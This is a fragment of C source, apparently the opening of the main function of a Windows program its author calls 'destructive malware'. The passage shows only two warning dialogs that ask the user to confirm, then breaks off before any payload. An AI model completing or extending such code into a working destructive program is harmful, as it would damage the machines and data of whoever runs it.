...
// ---- MAIN ----
int main() {
    if (MessageBoxW(NULL, L"Do you really want to start this destructive malware?", L"hexacbngdfgjgsffgh1.5.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure? It will destroy your PC, i'm not lying!'", 
                    L"hexacbngdfgjgsffgh1.5.exe - LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
